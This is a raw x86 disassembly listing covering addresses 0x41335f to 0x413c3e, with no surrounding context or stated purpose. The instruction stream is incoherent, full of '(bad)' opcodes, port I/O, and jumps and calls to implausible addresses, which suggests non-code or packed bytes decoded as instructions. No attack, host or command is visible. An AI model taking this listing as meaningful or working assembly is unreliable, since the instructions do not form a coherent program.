  41335f:	add    eax,0x724fb6c3
  413364:	push   ebp
  413365:	and    ecx,edx
  413367:	xor    al,0xc6
  413369:	sbb    al,0x8a
  41336b:	and    DWORD PTR [edx-0xcdffdb8],ecx
  413371:	sub    ah,BYTE PTR [ecx-0x17eb6a8e]
  413377:	cmp    BYTE PTR [ecx-0x33d73678],ah
  41337d:	cld    
  41337e:	add    ah,BYTE PTR [ebx]
  413380:	and    bh,BYTE PTR [edi+0x4aa3bd23]
  413386:	cmp    dl,BYTE PTR [eax]
  413388:	inc    eax
  413389:	add    eax,edi
  41338b:	lods   eax,DWORD PTR ds:[esi]
  41338c:	inc    eax
  41338d:	out    dx,eax
  41338e:	add    cl,ch
	...
  4133a4:	add    BYTE PTR [edx+eax*1-0x1cd1197b],ah
  4133ab:	cmp    ah,BYTE PTR [eax+eiz*1+0x4f3d8adf]
  4133b2:	jmp    0x413403
  4133b4:	cmp    esp,DWORD PTR [edx]
  4133b6:	dec    ebp
  4133b7:	out    0x0,eax
  4133b9:	mov    al,0xf4
  4133bb:	std    
  4133bc:	call   DWORD PTR [ebp-0x55bb7629]
  4133c2:	cs push ebx
  4133c4:	push   eax
  4133c5:	test   DWORD PTR [ecx-0x1dd4801a],esi
  4133cb:	std    
  4133cc:	cmp    esp,esi
  4133ce:	icebp  
  4133cf:	mov    eax,DWORD PTR [edx]
  4133d1:	or     eax,0xa282ffff
  4133d6:	sub    dl,BYTE PTR [edx]
  4133d8:	add    cl,dh
  4133da:	xor    ebp,0x2
  4133dd:	into   
  4133de:	inc    BYTE PTR [edx-0x720e3203]
  4133e4:	aam    0xbe
  4133e6:	(bad)  
  4133e7:	dec    DWORD PTR [edx-0x74e1dcee]
  4133ed:	cli    
  4133ee:	and    dl,BYTE PTR [esi-0x75]
  4133f1:	dec    eax
  4133f2:	adc    eax,DWORD PTR [edx]
  4133f4:	add    BYTE PTR [esi+0xffdbf85],bh
  4133fa:	xchg   al,al
  4133fc:	add    edi,DWORD PTR [edi+edi*2]
  4133ff:	mov    esi,0x4a893e03
  413404:	and    al,0x82
  413406:	push   ebp
  413407:	mov    esi,ecx
	...
  41341d:	add    BYTE PTR [esi-0x5e000944],dh
  413423:	xchg   BYTE PTR [edx+0x24],al
  413426:	pop    esi
  413427:	xchg   DWORD PTR [edx+0x24],edx
  41342a:	pop    edx
  41342b:	xchg   DWORD PTR [edx+0x24],ebx
  41342e:	push   esi
  41342f:	aaa    
  413430:	rcl    DWORD PTR [edx-0x2b],0xb3
  413434:	dec    esi
  413435:	jl     0x4134a2
  413437:	out    dx,al
  413438:	and    dh,ch
  41343a:	inc    ecx
  41343b:	cli    
  41343c:	push   ebx
  41343d:	push   ebx
  41343e:	aad    0xc8
  413440:	xchg   DWORD PTR [edx+ebp*4+0x12],eax
  413444:	out    0x17,al
  413446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413447:	ss push ds
  413449:	(bad)  
  41344a:	sbb    al,0xf8
  41344c:	out    0x23,eax
  41344e:	jl     0x4134ba
  413450:	jl     0x4133d4
  413452:	add    eax,0x2cc2012d
  413457:	fs inc esp
  413459:	clc    
  41345a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41345b:	inc    esp
  41345c:	out    dx,eax
  41345d:	out    0x8,eax
  41345f:	js     0x41347f
  413461:	(bad)  
  413462:	pop    edx
  413463:	fmul   QWORD PTR [edx-0x1817d133]
  413469:	sub    edi,edi
  41346b:	jge    0x413484
  41346d:	(bad)  
  41346e:	call   0x6bcb8007
  413473:	aas    
  413474:	out    0x2a,al
  413476:	out    dx,eax
  413477:	sub    al,0x4b
  413479:	mov    bh,0xbe
  41347b:	int    0x8a
  41347d:	sub    eax,0xf934b2d0
	...
  413496:	add    BYTE PTR [esi+edx*8],ch
  413499:	inc    esp
  41349a:	call   0x8a896137
  41349f:	imul   edi,edi,0xffffffd7
  4134a2:	add    bl,bh
  4134a4:	add    al,0x2d
  4134a6:	jl     0x413457
  4134a8:	loopne 0x413471
  4134aa:	and    esi,DWORD PTR [ebx-0x58fffdd6]
  4134b0:	sahf   
  4134b1:	push   ds
  4134b2:	jne    0x413473
  4134b4:	and    al,0x47
  4134b6:	jnp    0x413483
  4134b8:	xchg   esp,eax
  4134b9:	mov    bh,0x23
  4134bb:	mov    bh,0x5b
  4134bd:	mov    al,0x8a
  4134bf:	popa   
  4134c0:	add    edx,DWORD PTR [ebp-0xd]
  4134c3:	push   0x2cd78b00
  4134c8:	pop    edi
  4134c9:	out    0x27,al
  4134cb:	bnd jnp 0x413457
  4134ce:	int    0x3f
  4134d0:	int    0x17
  4134d2:	dec    BYTE PTR [eax+0x2]
  4134d5:	and    bh,BYTE PTR [ecx+esi*4]
  4134d8:	xchg   BYTE PTR [ebx],al
  4134da:	add    ah,BYTE PTR [edi-0x7b6095fe]
  4134e0:	out    dx,al
  4134e1:	call   0xeb3d56f4
  4134e6:	add    esp,DWORD PTR [edi+0x70e81c8d]
  4134ec:	jg     0x4134a3
  4134ee:	push   cs
  4134ef:	sub    ebp,DWORD PTR [ebp-0x7a58fc19]
  4134f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134f6:	add    al,0xb0
  4134f8:	cmp    BYTE PTR [eax],0x5
	...
  41350f:	add    BYTE PTR [edi-0x3b489dfe],ah
  413515:	scas   al,BYTE PTR es:[edi]
  413516:	popa   
  413517:	dec    esi
  413518:	mov    ebp,0xad07734d
  41351d:	frstor [ebp-0x5272596b]
  413523:	mov    bl,0x1d
  413525:	mov    esi,0x397df7c4
  41352a:	mov    ecx,0x4c633b3
  41352f:	loopne 0x413588
  413531:	lea    esp,[esi]
  413533:	mov    WORD PTR [esi+ebx*8+0x4],cs
  413537:	sub    al,0xdc
  413539:	adc    BYTE PTR [ebp+0x1e],al
  41353c:	fist   WORD PTR [esi-0x30e927fc]
  413542:	popa   
  413543:	mov    bh,0xc4
  413545:	rcl    BYTE PTR [ebp+0x10491db1],cl
  41354b:	loopne 0x4135c1
  41354d:	sbb    BYTE PTR ds:0xac8c508a,bl
  413553:	out    0xb8,eax
  413555:	scas   eax,DWORD PTR es:[edi]
  413556:	mov    eax,0xd62b5a8a
  41355b:	pop    ss
  41355c:	popa   
  41355d:	sbb    cl,al
  41355f:	inc    edx
  413560:	sub    eax,0x58ccffb7
  413565:	xchg   esi,eax
  413566:	punpckldq mm3,DWORD PTR [eax-0x1c]
  41356a:	das    
  41356b:	jb     0x41356c
  41356d:	jecxz  0x4135a2
  41356f:	jo     0x4135c8
  413571:	in     al,0x37
  413573:	pusha  
	...
  413588:	add    bh,ch
  41358a:	jecxz  0x4135c7
  41358c:	bound  ebx,QWORD PTR [edi-0x1c]
  41358f:	nop    DWORD PTR [esi-0x38]
  413593:	mov    ch,BYTE PTR [edi-0x490f1f35]
  413599:	mov    dl,0x8c
  41359b:	dec    ebx
  41359c:	add    eax,0x7250b0eb
  4135a1:	jno    0x41352f
  4135a3:	xlat   BYTE PTR ds:[ebx]
  4135a4:	xchg   ecx,eax
  4135a5:	pushf  
  4135a6:	adc    al,0xfe
  4135a8:	xchg   esi,eax
  4135a9:	into   
  4135aa:	inc    esp
  4135ab:	push   cs
  4135ac:	pop    esp
  4135ad:	adc    BYTE PTR [edi],0xfe
  4135b0:	jmp    0xd164f1e4
  4135b5:	push   DWORD PTR [ebp+0x23]
  4135b8:	in     eax,dx
  4135b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135ba:	add    dh,BYTE PTR [ebp+0x11]
  4135bd:	push   ds
  4135be:	mov    ah,0x23
  4135c0:	std    
  4135c1:	das    
  4135c2:	les    esp,FWORD PTR [ebx]
  4135c4:	stc    
  4135c5:	repz mov cl,0x4f
  4135c8:	bound  esp,QWORD PTR [ecx+0x1f]
  4135cb:	icebp  
  4135cc:	pop    ecx
  4135cd:	mov    bl,BYTE PTR [eax]
  4135cf:	push   esp
  4135d0:	call   0xeb80:0xa588452f
  4135d7:	out    0x2f,eax
  4135d9:	mov    dh,0x18
  4135db:	(bad)  
  4135dc:	bound  esi,QWORD PTR [edi-0x1d]
  4135df:	and    ebp,edx
  4135e1:	in     al,dx
  4135e2:	mov    edx,ss
  4135e4:	mov    ah,0x66
  4135e6:	mov    cl,BYTE PTR [ebx-0x33]
  4135e9:	jl     0x41359c
  4135eb:	mov    bl,BYTE PTR [edi]
	...
  413601:	add    BYTE PTR [ebx-0x56ff0d99],bh
  413607:	cmc    
  413608:	mov    eax,ebx
  41360a:	aad    0x4a
  41360c:	and    bh,BYTE PTR [eax]
  41360e:	xor    DWORD PTR [ebx-0x77],edx
  413611:	into   
  413612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413613:	mov    ds:0x8a49fff1,eax
  413618:	push   0x24
  41361a:	stos   BYTE PTR es:[edi],al
  41361b:	add    eax,ebx
  41361d:	mov    eax,DWORD PTR [edx-0x2c4ddd6]
  413623:	mov    DWORD PTR [edx+0x24],ebx
  413626:	(bad)  
  413627:	js     0x413670
  413629:	jmp    0x41362d
  41362b:	mov    bl,BYTE PTR [edx+0x24]
  41362e:	mov    dh,0x89
  413630:	inc    edx
  413631:	and    al,0x16
  413633:	cmp    al,BYTE PTR [esp+0x75000312]
  41363a:	test   DWORD PTR [ecx+0x30228bc],0x19920000
  413644:	cmp    eax,DWORD PTR [eax]
  413646:	rol    DWORD PTR [edx],cl
  413648:	add    BYTE PTR [ebx+eax*8-0x7f],bh
  41364c:	std    
  41364d:	add    dl,dl
  41364f:	and    BYTE PTR [edi+0x7c],bh
  413652:	loop   0x41368e
  413654:	(bad)  
  413655:	jl     0x413625
  413657:	add    bh,BYTE PTR [ebp+eax*1+0x4d]
  41365b:	test   BYTE PTR [ecx],0x74
  41365e:	lods   eax,DWORD PTR ds:[esi]
  41365f:	mov    DWORD PTR [edx+0x24],ecx
  413662:	xchg   esi,eax
  413663:	dec    ebp
  413664:	dec    edi
  413665:	mov    eax,DWORD PTR [eax]
	...
  41367b:	fsubr  st,st(1)
  41367d:	int3   
  41367e:	repz fdecstp 
  413681:	jmp    0x22973bb6
  413686:	pop    eax
  413687:	add    eax,0xf510223e
  41368c:	shr    BYTE PTR [ecx],cl
  41368e:	xlat   BYTE PTR ds:[ebx]
  41368f:	cmp    al,0x52
  413691:	mov    esi,ecx
  413693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413694:	add    ebp,DWORD PTR [esi-0x11]
  413697:	push   0x8b431c05
  41369c:	cmp    edi,DWORD PTR [edi-0x12]
  41369f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136a0:	mov    fs,WORD PTR [edx+ebp*8]
  4136a3:	mov    ch,0xa0
  4136a5:	mov    dh,0x23
  4136a7:	mov    bh,0xb6
  4136a9:	(bad)  
  4136aa:	(bad)  
  4136ab:	(bad)  
  4136ac:	(bad)  [esi+0x139a4fcd]
  4136b2:	(bad)  
  4136b3:	xor    cl,bh
  4136b5:	sbb    al,BYTE PTR [edx-0x70f6d6d6]
  4136bb:	es sub al,0x2
  4136be:	add    BYTE PTR [esi+ebx*4],ch
  4136c1:	out    dx,eax
  4136c2:	add    esp,DWORD PTR [edi+0x7752af2b]
  4136c8:	mov    al,ds:0x7ba1e749
  4136cd:	sbb    bh,dh
  4136cf:	sub    al,0xe8
  4136d1:	fbld   TBYTE PTR [edi]
  4136d3:	pop    edx
  4136d4:	fimul  DWORD PTR [esi+0x2b541ccd]
  4136da:	out    dx,eax
  4136db:	aad    0x7c
  4136dd:	sbb    bh,BYTE PTR [edx]
	...
  4136f3:	add    ah,ah
  4136f5:	adc    al,0xea
  4136f7:	mov    ch,BYTE PTR [ebx+0x47]
  4136fa:	jmp    0xc0ff:0xfe40213a
  413701:	or     eax,DWORD PTR ss:[ebx-0xc07]
  413708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413709:	sub    ecx,DWORD PTR [esi-0xd495bc]
  41370f:	jmp    DWORD PTR [edi-0x657d00c1]
  413715:	sub    DWORD PTR [esi-0x68d42dfa],ecx
  41371b:	dec    DWORD PTR [eax-0x1c752b99]
  413721:	add    cl,ch
  413723:	mov    ebx,0xefc4a62f
  413728:	sub    esp,DWORD PTR [edi]
  41372a:	pushf  
  41372b:	jecxz  0x41374a
  41372d:	ins    BYTE PTR es:[edi],dx
  41372e:	hlt    
  41372f:	jmp    DWORD PTR [eax+0x15]
  413732:	cdq    
  413733:	mov    ch,0x2d
  413735:	inc    esp
  413736:	adc    ch,ah
  413738:	inc    eax
  413739:	adc    eax,0x2a75bf5
  41373e:	jmp    0xfcbddd46
  413743:	(bad)  
  413744:	cmp    BYTE PTR ds:0xee84c00f,dl
  41374a:	pop    ebx
  41374b:	and    al,0x1b
  41374d:	mov    dh,0xeb
  41374f:	sbb    cl,BYTE PTR ds:0xc4b771b8
  413755:	mov    edx,0xbf71
	...
  41376a:	add    BYTE PTR [eax],al
  41376c:	add    ah,al
  41376e:	jmp    0x6c0:0x441db41b
  413775:	hlt    
  413776:	adc    al,0xa5
  413778:	add    al,0x49
  41377a:	out    dx,al
  41377b:	in     al,0x3
  41377d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41377e:	xchg   DWORD PTR [ecx+edi*8],esi
  413781:	jmp    0x7cd002ae
  413786:	fisub  WORD PTR [eax]
  413788:	sbb    ecx,0x5c8ed68e
  41378e:	faddp  st(0),st
  413790:	mov    ?,WORD PTR [edx]
  413792:	out    dx,al
  413793:	in     al,0x3
  413795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413796:	mov    edx,esp
  413798:	fistp  QWORD PTR [ebx+ecx*4-0x54]
  41379c:	fistp  QWORD PTR [eax-0x75]
  41379f:	mov    esp,0x41bd98df
  4137a4:	icebp  
  4137a5:	sub    edx,DWORD PTR [esp+edi*4]
  4137a8:	push   es
  4137a9:	loopne 0x4137d2
  4137ab:	in     eax,dx
  4137ac:	mov    gs,WORD PTR [edx]
  4137ae:	out    dx,eax
  4137af:	(bad)  
  4137b0:	in     al,dx
  4137b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137b2:	add    dl,BYTE PTR [ebx-0x67]
  4137b5:	xor    DWORD PTR [esi-0x19],eax
  4137b8:	pop    edi
  4137b9:	int    0x14
  4137bb:	(bad)  
  4137bc:	push   ds
  4137bd:	es lock add ebp,ecx
  4137c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c2:	jge    0x4137c2
  4137c4:	fsubrp st(0),st
  4137c6:	sub    bh,bh
  4137c8:	call   0xc5bd0f71
  4137cd:	js     0x4137d4
  4137cf:	test   DWORD PTR [eax],ecx
	...
  4137e5:	add    BYTE PTR [edx+eax*1-0x1fef9e00],ah
  4137ec:	push   ebx
  4137ed:	jb     0x4137dd
  4137ef:	call   0x8e8a4be
  4137f4:	cmp    ebp,DWORD PTR [esi-0x5974fdeb]
  4137fa:	pop    ebx
  4137fb:	mov    DWORD PTR [ebx+0xd],eax
  4137fe:	pop    ss
  4137ff:	mov    edx,ebp
  413801:	adc    bh,BYTE PTR [esi-0x209bb052]
  413807:	fistp  QWORD PTR [ebx]
  413809:	sbb    BYTE PTR [edx],dh
  41380b:	inc    esi
  41380c:	mov    BYTE PTR ds:0x17e7e007,dl
  413812:	mov    al,ds:0x10d0fe14
  413817:	loopne 0x41384c
  413819:	sbb    esi,edi
  41381b:	mov    BYTE PTR [ebx-0x33],dl
  41381e:	hlt    
  41381f:	lods   al,BYTE PTR ds:[esi]
  413820:	push   ecx
  413821:	jb     0x413880
  413823:	sbb    esp,esi
  413825:	js     0x4137d5
  413827:	adc    al,0x8a
  413829:	xor    DWORD PTR [edx],0xf62123c0
  41382f:	ret    
  413830:	mov    ch,BYTE PTR [edi]
  413832:	sub    DWORD PTR [ebx],0xfffffff0
  413835:	push   esi
  413836:	mov    ds,eax
  413838:	les    esp,FWORD PTR [edx+0x4f]
  41383b:	fist   WORD PTR [ebx]
  41383d:	add    BYTE PTR [eax+0xf],ah
  413840:	mov    DWORD PTR [edx+ebp*4+0x2e],ecx
  413844:	mov    DWORD PTR [edx+ebx*4+0x32],edx
  413848:	xchg   DWORD PTR [eax+eax*1+0x0],ecx
	...
  41385c:	add    BYTE PTR [eax],al
  41385e:	add    BYTE PTR [edx+0x6a548736],ch
  413864:	sub    ecx,DWORD PTR [ecx+0x550f6a44]
  41386a:	push   ebp
  41386b:	cs xchg ah,cl
  41386e:	call   0x3f2112
  413873:	aad    0x4a
  413875:	and    bh,BYTE PTR [eax]
  413877:	cmp    DWORD PTR [eax-0x77],edx
  41387a:	into   
  41387b:	(bad)
  41387e:	mov    ds:0x3bfdfa3f,eax
  413883:	or     ebp,DWORD PTR [eax+edi*1-0x75]
  413887:	mov    ah,BYTE PTR [edx]
  413889:	cmp    edi,DWORD PTR ss:[eax+0xe000233]
  413890:	test   BYTE PTR [edi],al
  413892:	and    DWORD PTR [eax],0x27
  413895:	add    al,BYTE PTR [eax]
  413897:	(bad)  
  413898:	(bad)  
  413899:	jae    0x4138b3
  41389b:	adc    edi,edi
  41389d:	add    al,0x0
  41389f:	push   cs
  4138a0:	imul   eax,DWORD PTR [ebx],0xffffff83
  4138a3:	inc    ecx
  4138a4:	std    
  4138a5:	jae    0x4138c0
  4138a7:	sar    esi,cl
  4138a9:	jl     0x4138ab
  4138ab:	(bad)  
  4138ac:	push   0x3
  4138ae:	xor    DWORD PTR [ecx],0xfffffffe
  4138b1:	jae    0x4138c0
  4138b3:	mov    ecx,0x36ce894e
  4138b8:	out    0xef,al
  4138ba:	call   DWORD PTR [ecx+0x2e]
  4138bd:	std    
  4138be:	jmp    0x4138ae
  4138c0:	test   DWORD PTR [edx+0x24],ebp
	...
  4138d7:	add    BYTE PTR [esi-0x410001ed],bh
  4138dd:	dec    BYTE PTR [edx+0x3100a7d3]
  4138e3:	push   ecx
  4138e4:	cli    
  4138e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e6:	dec    eax
  4138e7:	out    0x60,eax
  4138e9:	mov    edx,0x9ceafe17
  4138ee:	daa    
  4138ef:	add    BYTE PTR [edx],dl
  4138f1:	(bad)  
  4138f2:	mov    DWORD PTR [ebx-0x35],ebp
  4138f5:	sub    ecx,DWORD PTR [ebx-0x3cb03cbd]
  4138fb:	inc    edi
  4138fc:	push   ds
  4138fd:	push   eax
  4138fe:	ficom  WORD PTR [edi-0x54]
  413901:	rol    DWORD PTR [edi],cl
  413903:	sbb    BYTE PTR [eax],0xf4
  413906:	pop    ss
  413907:	(bad)  
  413908:	and    cl,BYTE PTR [ecx]
  41390a:	or     BYTE PTR [ebx+esi*1+0x2400021c],al
  413911:	sbb    DWORD PTR [eax],eax
  413913:	movaps XMMWORD PTR [ebp-0x6b58fffe],xmm3
  41391a:	(bad)  
  41391b:	and    edx,DWORD PTR [edi+0x7cc28ad8]
  413921:	pusha  
  413922:	mov    bl,0x50
  413924:	sub    al,0x72
  413926:	sub    ebp,DWORD PTR [esi]
  413928:	or     DWORD PTR [ecx+0x16],ecx
  41392b:	mov    bh,BYTE PTR [ebx+0x7]
  41392e:	fcom   QWORD PTR [esi+0x75]
  413931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413932:	inc    ebp
  413933:	mov    cl,BYTE PTR [edi]
  413935:	inc    esp
  413936:	add    al,0xf1
  413938:	clc    
  413939:	push   0xc4da
	...
  41394e:	add    BYTE PTR [eax],al
  413950:	add    BYTE PTR [eax-0x1a],dh
  413953:	mov    al,BYTE PTR [ebx-0x3d]
  413956:	xor    ebx,ecx
  413958:	test   DWORD PTR [ebx+0x52000227],ecx
  41395e:	adc    al,BYTE PTR [ecx+0x2277fbd]
  413964:	add    BYTE PTR [edi-0x58c305f1],ah
  41396a:	add    al,BYTE PTR es:[eax]
  41396d:	cmp    eax,DWORD PTR [edx]
  41396f:	in     al,dx
  413970:	xor    BYTE PTR [ecx+0x6bdfd504],0x2
  413977:	aam    0x3
  413979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41397a:	mov    fs,ebx
  41397c:	sbb    BYTE PTR [ecx-0x60442fb],0xb2
  413983:	jno    0x4139cb
  413985:	cmp    BYTE PTR [ebx+0x1d811737],0xf6
  41398c:	mov    eax,0x4c69b1dd
  413991:	jno    0x413943
  413993:	imul   eax,DWORD PTR [eax-0x50],0x2c03f044
  41399a:	sahf   
  41399b:	(bad)  
  41399c:	repz sub eax,0xe03ed145
  4139a2:	mov    bh,0x71
  4139a4:	inc    esi
  4139a5:	inc    eax
  4139a6:	icebp  
  4139a7:	push   es
  4139a8:	pop    ss
  4139a9:	inc    ecx
  4139aa:	(bad)  
  4139ab:	imul   esp,DWORD PTR [edi],0x2ad397a7
  4139b1:	mov    al,ds:0xe0347d
	...
  4139ca:	cwde   
  4139cb:	jg     0x4139ee
  4139cd:	pop    ss
  4139ce:	ja     0x413984
  4139d0:	popa   
  4139d1:	inc    ebp
  4139d2:	add    BYTE PTR [ecx],cl
  4139d4:	xlat   BYTE PTR ds:[ebx]
  4139d5:	push   ss
  4139d6:	adc    DWORD PTR [ebp+0x3c],edi
  4139d9:	loopne 0x413a4f
  4139db:	dec    edi
  4139dc:	out    0x3,eax
  4139de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139df:	add    dh,dl
  4139e1:	ss jne 0x4139c7
  4139e4:	jae    0x413a60
  4139e6:	lock adc al,ch
  4139e9:	add    ebx,DWORD PTR [eax+ecx*4]
  4139ec:	cld    
  4139ed:	jmp    eax
  4139ef:	adc    BYTE PTR [ecx],bh
  4139f1:	mov    ah,0x2d
  4139f3:	inc    eax
  4139f4:	nop
  4139f5:	and    bl,al
  4139f7:	adc    BYTE PTR [ebp+0x4],bh
  4139fa:	stc    
  4139fb:	cmc    
  4139fc:	(bad)  
  4139fd:	in     al,dx
  4139fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ff:	add    al,BYTE PTR [ebx]
  413a01:	mov    ebp,ds
  413a03:	das    
  413a04:	jno    0x413a52
  413a06:	and    eax,0x32e8fe3c
  413a0b:	in     eax,dx
  413a0c:	add    ebp,ecx
  413a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a0f:	jge    0x413a5b
  413a11:	loopne 0x413a4a
  413a13:	jmp    0x41399f
  413a15:	outs   dx,DWORD PTR ds:[esi]
  413a16:	xchg   esp,eax
  413a17:	add    al,0x0
  413a19:	jmp    0xed58c039
  413a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a1f:	add    al,BYTE PTR [eax+0x60]
  413a22:	and    ch,ah
  413a24:	add    ebp,ecx
  413a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a27:	jns    0x4139ae
  413a29:	stc    
  413a2a:	push   0x62fe10
	...
  413a43:	loop   0x413a3c
  413a45:	add    ebp,ecx
  413a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a48:	jl     0x413a59
  413a4a:	jmp    0x4139e2
  413a4c:	or     eax,0x35471c1
  413a51:	sahf   
  413a52:	aad    0x40
  413a54:	adc    dh,bh
  413a56:	je     0x413a93
  413a58:	jge    0x4139df
  413a5a:	stc    
  413a5b:	xor    BYTE PTR [eax],dl
  413a5d:	(bad)  
  413a5e:	jo     0x413a09
  413a60:	test   DWORD PTR [ebx],0x88c2a4e9
  413a66:	pop    edi
  413a67:	pop    ds
  413a68:	add    al,0x0
  413a6a:	jmp    0xe550c08c
  413a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a70:	add    cl,BYTE PTR [ebx+0x4036f]
  413a76:	jmp    0xbb433aa9
  413a7b:	cdq    
  413a7c:	inc    ecx
  413a7d:	xchg   ecx,edi
  413a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a80:	jo     0x413a9d
  413a82:	in     eax,dx
  413a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a84:	add    dh,BYTE PTR [ebp-0x10]
  413a87:	das    
  413a88:	xchg   BYTE PTR [edi],cl
  413a8a:	add    dl,al
  413a8c:	add    eax,DWORD PTR [eax]
  413a8e:	mov    DWORD PTR [eax+0xe],eax
  413a91:	add    al,BYTE PTR [eax]
  413a93:	into   
  413a94:	inc    ebx
  413a95:	xchg   DWORD PTR [esi-0x1f016],ecx
  413a9b:	aaa    
  413a9c:	nop
  413a9d:	push   cs
  413a9e:	add    al,0xbe
  413aa0:	add    ecx,DWORD PTR [ebx-0x1f0697a]
  413aa6:	inc    DWORD PTR [eax]
	...
  413abc:	fisub  WORD PTR [esi]
  413abe:	mov    DWORD PTR [esi-0x1f092],eax
  413ac4:	rol    BYTE PTR [esi],0x0
  413ac7:	mov    ecx,DWORD PTR [eax]
  413ac9:	or     eax,DWORD PTR [edx]
  413acb:	add    BYTE PTR [esi-0x7de77b86],cl
  413ad1:	add    eax,DWORD PTR [eax]
  413ad3:	add    eax,ebx
  413ad5:	push   ss
  413ad6:	add    al,BYTE PTR [eax]
  413ad8:	dec    esi
  413ad9:	sbb    cl,bl
  413adb:	shr    BYTE PTR [esi+0x7a],cl
  413ade:	inc    edx
  413adf:	and    al,0xa
  413ae1:	nop
  413ae2:	mov    esi,0x4a7a0f74
  413ae7:	and    al,0x2e
  413ae9:	jp     0x413a7f
  413aeb:	adc    BYTE PTR [edx+0x3],al
  413aee:	add    BYTE PTR [ebx],ch
  413af0:	jb     0x413b14
  413af2:	dec    esi
  413af3:	push   ecx
  413af4:	mov    ch,0x85
  413af6:	adc    al,BYTE PTR [esi+ecx*1]
  413af9:	add    ebp,DWORD PTR [ebx]
  413afb:	dec    esp
  413afc:	mov    ds:0xb1515056,al
  413b01:	cmc    
  413b02:	into   
  413b03:	add    DWORD PTR [edx+0x13],0xffffff83
  413b07:	rol    bl,0xfa
  413b0a:	pop    esp
  413b0b:	mov    ecx,DWORD PTR [ebp+0x4a]
  413b0e:	pop    ebp
  413b0f:	pop    esi
  413b10:	jge    0x413ae1
  413b12:	ss ret 0x6a6
  413b16:	mov    eax,DWORD PTR [esi-0x1f659]
  413b1c:	fadd   DWORD PTR [ebx-0x42]
  413b1f:	and    eax,DWORD PTR [eax]
	...
  413b35:	ja     0x413b1d
  413b37:	mov    eax,0x3e9c695e
  413b3c:	aaa    
  413b3d:	in     eax,0x30
  413b3f:	add    bh,BYTE PTR [eax+0x819a7]
  413b45:	in     al,0x93
  413b47:	mov    esi,0x4a94a323
  413b4c:	ror    BYTE PTR [esi-0x50bc7ae7],0x5b
  413b53:	aas    
  413b54:	mov    ch,bl
  413b56:	inc    DWORD PTR [edi]
  413b58:	cmp    DWORD PTR [ebx+0x0],0x9ea70000
  413b5f:	inc    edx
  413b60:	je     0x413b02
  413b62:	call   0xc302:0x1bab2b3e
  413b69:	sbb    al,0xa0
  413b6b:	fiadd  WORD PTR [ebx-0x55]
  413b6e:	sbb    eax,DWORD PTR [edx]
  413b70:	mov    esi,DWORD PTR [ebx]
  413b72:	dec    eax
  413b73:	ret    0xa703
  413b76:	sbb    esi,DWORD PTR [ecx-0x3db7e476]
  413b7c:	add    esp,DWORD PTR [edi+0x138ab01b]
  413b82:	dec    eax
  413b83:	(bad)  
  413b84:	add    esp,DWORD PTR [edi+0x1c4fb31b]
  413b8a:	test   al,0xe7
  413b8c:	aas    
  413b8d:	stos   DWORD PTR es:[edi],eax
  413b8e:	sbb    eax,DWORD PTR [edx]
  413b90:	push   edx
  413b91:	ja     0x413b41
  413b93:	mov    edi,0xb333af23
  413b98:	hlt    
	...
  413bad:	add    BYTE PTR [eax],cl
  413baf:	dec    ebp
  413bb0:	test   bl,al
  413bb2:	rcr    DWORD PTR [edi],cl
  413bb4:	add    al,BYTE PTR [eax]
  413bb6:	in     al,0x6f
  413bb8:	aas    
  413bb9:	retf   
  413bba:	jecxz  0x413bbe
  413bbc:	mov    ch,0x40
  413bbe:	fdivr  QWORD PTR [esi]
  413bc0:	lods   al,BYTE PTR ds:[esi]
  413bc1:	inc    eax
  413bc2:	in     al,dx
  413bc3:	cmp    edi,DWORD PTR ds:[ebp-0x3d]
  413bc7:	cmp    DWORD PTR [esp+edx*1-0x30],0xd
  413bcc:	call   0x71f6ae87
  413bd1:	mov    ecx,0x391d3a8
  413bd6:	icebp  
  413bd7:	push   ecx
  413bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bd9:	ret    0x267
  413bdc:	jo     0x413bf2
  413bde:	out    0xa,eax
  413be0:	jmp    0xf94794e7
  413be5:	jl     0x413b7e
  413be7:	add    DWORD PTR [edi+0xb],0xfd7455a0
  413bee:	hlt    
  413bef:	mov    esp,0x3a2a03a7
  413bf4:	in     eax,0x78
  413bf6:	push   edi
  413bf7:	std    
  413bf8:	jbe    0x413c3f
  413bfa:	sub    dh,al
  413bfc:	add    edi,DWORD PTR [eiz*8-0x2333de7f]
  413c03:	xor    edx,edi
  413c05:	xor    eax,0xff8b81c2
  413c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c0b:	xchg   edi,eax
  413c0c:	bnd jl 0x413c67
  413c0f:	adc    eax,0x8120
	...
  413c24:	add    BYTE PTR [eax],al
  413c26:	add    ah,ch
  413c28:	add    dl,bh
  413c2a:	push   ds
  413c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c2c:	jg     0x413c0a
  413c2e:	cmc    
  413c2f:	and    ecx,DWORD PTR [ebx+0x4f0486e7]
  413c35:	clc    
  413c36:	adc    ah,BYTE PTR [ecx]
  413c38:	or     eax,0x7f4486e8
  413c3d:	clc    
  413c3e:	adc    dl,BYTE PTR [ecx]
